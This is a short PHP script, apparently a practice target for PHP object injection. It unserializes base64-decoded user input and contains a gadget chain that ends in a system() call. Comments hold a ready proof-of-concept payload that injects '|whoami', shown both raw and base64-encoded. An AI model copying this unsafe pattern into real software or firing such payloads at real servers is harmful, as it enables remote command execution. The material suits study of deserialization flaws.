<?php
	class getip{
		public $ip;
		
		function __construct(){
			$this->ip = "127.0.0.1";
		}
		
		function __destruct(){
			echo 'The ip is'.$this->ip;
		}
	}
		 
	class getresult{
		public $obj;
		public $ip;
		
		function __construct(){
			$this->ip = '127.0.0.1';
			$this->obj = null;
		}
		function __toString(){
			$this->obj->execute();
			return $this->ip;
		}
	}
 
	class ping{
		private $ip;
		
		function execute(){
			$str = 'ping '.$this->ip;
			system($str);
		}
	}
	//$unbase = base64_decode($_GET['address']);
	//echo $unbase;
	//$poc='O:5:"getip":1:{s:2:"ip";O:9:"getresult":2:{s:3:"obj";O:4:"ping":1:{s:8:"%00ping%00ip";s:7:"|whoami";}s:2:"ip";s:9:"127.0.0.1";}}';
	//echo base64_encode($poc);
	//echo $poc."<br>";
	//print_r(unserialize($poc));
	
	//$poc2=$_GET['address'];
	//echo base64_encode($poc2);
	//unserialize($poc2);
	//print_r(unserialize($poc2));
	
	unserialize(base64_decode($_GET['address']));
	//show_source(__FILE__);
	//Tzo1OiJnZXRpcCI6MTp7czoyOiJpcCI7Tzo5OiJnZXRyZXN1bHQiOjI6e3M6Mzoib2JqIjtPOjQ6InBpbmciOjE6e3M6ODoiAHBpbmcAaXAiO3M6NzoifHdob2FtaSI7fXM6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjt9fQ==
?>
